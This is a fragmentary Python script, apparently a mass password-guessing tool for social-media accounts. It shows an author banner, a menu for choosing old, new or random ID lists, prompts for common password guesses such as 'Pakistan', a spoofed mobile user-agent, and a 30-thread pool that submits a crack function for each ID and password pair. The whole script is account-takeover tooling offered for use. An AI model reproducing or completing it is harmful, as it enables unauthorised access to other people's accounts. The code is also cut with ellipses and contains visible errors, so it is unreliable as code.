...
uas_random = random.choice['Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
...
def logo():
    print("""\n
 \033[1;92m                       [+] Forget on Allaha Almighty [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m  A Z A N          \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m  0316****          \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGitHub    : \033[1;92m  Mr-Azan           \033[1;31;1m █
...
def setting():
	__yan__('=' * 40)
	cetak('[bold green] [•]1. OLD ID\n [•]2. NEW ID(Disarankan)\n [•]3. RANDOM ID[bold green]')
	__yan__('=' * 40)
	hu = input('[•]Pilih : ')
	if hu in ['1','01']:
...
[9]. yandex.com''')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('Input six minimun caracter\nExample :[green] Pakistan,khankhan,First Laat[white] ')
...
def passwrd():
	...
	__yan__('=' * 40);prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
	with prog:
		with YayanGanteng(max_workers=30) as (__yayanXD__): 
			for yuzong in id2:
				...
				if 'mobile' in method:
					__yayan__.submit(crack,idf,pwv)
				else:
					__yayan__.submit(crack,idf,pwv)
		print('')
